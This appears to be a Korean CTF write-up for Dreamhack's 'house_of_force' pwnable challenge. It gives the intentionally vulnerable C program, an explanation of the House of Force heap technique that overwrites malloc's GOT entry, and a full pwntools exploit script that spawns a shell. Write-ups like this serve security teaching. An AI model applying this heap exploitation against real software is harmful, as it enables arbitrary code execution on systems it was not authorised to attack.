---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN house_of_force"
excerpt: "드림핵 포너블 house_of_force 문제풀이"
tags: [Dreamhack, pwnable, wargame, writeup]
math: true
date: 2023-03-13 14:00
---

이번 문제는 house_of_force 취약점에 대한 문제이다. 이 기법은 top chunk의 사이즈를 조작하여 임의 주소에 힙 청크를 할당 할 수 있는 공격이다.

우선 바이너리 소스코드를 먼저 살펴보자.
```c++
// gcc -o force force.c -m32 -mpreferred-stack-boundary=2
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

int *ptr[10];

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
	int size;

	if( cnt > 10 ) {
		return 0;
	}

	printf("Size: ");
	scanf("%d", &size);

	ptr[cnt] = malloc(size);

	if(!ptr[cnt]) {
		return -1;
	}

	printf("Data: ");
	read(0, ptr[cnt], size);

	printf("%p: %s\n", ptr[cnt], ptr[cnt]);
	return 0;
}

int write_ptr() {
	int idx;
	int w_idx;
	unsigned int value;

	printf("ptr idx: ");
	scanf("%d", &idx);

	if(idx > 10 || idx < 0) {
		return -1;
	} 

	printf("write idx: ");
	scanf("%d", &w_idx);

	if(w_idx > 100 || w_idx < 0) {
		return -1;
	}
	printf("value: ");
	scanf("%u", &value);

	ptr[idx][w_idx] = value;

	return 0;
}

void get_shell() {
	system("/bin/sh");
}
int main() {
	int idx;
	int cnt = 0;
	int w_cnt = 0;
	initialize();

	while(1) {
		printf("1. Create\n");
		printf("2. Write\n");
		printf("3. Exit\n");
		printf("> ");

		scanf("%d", &idx);

		switch(idx) {
			case 1:
				create(cnt++);
				cnt++;
				break;
			case 2:
				if(w_cnt) {
					return -1;
				}
				write_ptr();
				w_cnt++;
				break;
			case 3:
				exit(0);
			default:
				break;
		}
	}

	return 0;
}
```
시나리오를 생각해보자.


우선 top chunk 주소를 알아낼 필요가 있다. 따라서 1번 메뉴를 통해 특정 사이즈 만큼의 청크를 생성하고 출력되는 주소값과 top chunk의 오프셋을 계산해 top chunk주소를 구한다.

이후 2번 메뉴를 통해 top chunk 크기를 0xffffffff로 덮어버린다. 배열 사이즈를 검증하지 않으므로 원하는 지점에 값을 덮을 수 있다. 그러면 탑 청크 크기만큼 청크를 할당 할 수 있으므로 원하는 주소의 값을 오버라이트 할 수 있다.

나는 malloc 함수 주소에 get_shell 함수 주소를 입력 하려고 한다. malloc got 주소에서 top chunk주소를 빼고 0x8를 뻰 값으로 페이로드를 구성한다. 0x8을 빼는 이유는 heap chunk가 구성될때 32비트 기준 8바이트를 헤더로 사용하기 때문에 오버라이트 하고자 하는 부분이 heap의 데이터 영역이 되게 하기 위함이다.

이후에 할당되는 부분은 malloc got의 주소에 값이 할당 될 것이며, 여기에는 get_shell 주소가 들어갈 것이다.

이후 malloc을 호출하면 쉘을 획득할 수 있다.


```python
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'debug'

#p = remote("host3.dreamhack.games", 24517);
#p = process("./oneshot", env={'LD_PRELOAD':'./libc.so.6'})
p = process("./house_of_force")
elf = ELF("./house_of_force")
#elf=ELF('./iofile_aw')

get_shell = 0x0804887e

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", b"17")
p.sendlineafter(b"Data: ", b"AAAA"*4)

leak_chunk = int(p.recvuntil(b"AAAA")[:-6], 16)
top_chunk = leak_chunk+20

print(f"leak chunk : {hex(leak_chunk)}")
print(f"top chunk size ptr : {hex(top_chunk)}")


p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"ptr idx: ", b"0")
p.sendlineafter(b"write idx: ", b"5")
p.sendlineafter(b"value: ", str(int(0xffffffff)))

target = elf.got['malloc']

payload = target-0x8-top_chunk
print(f"print - payload : {hex(payload)}")
print("print - "+("A"*payload))

#pause()
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", str(payload))
p.sendlineafter(b"Data: ", b"A"*payload)

pause()
print(f"send payload success")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", b"4")
p.sendlineafter(b"Data: ", p32(get_shell))

print(f"send shell ptr success")

p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(0x10))

p.interactive()
```

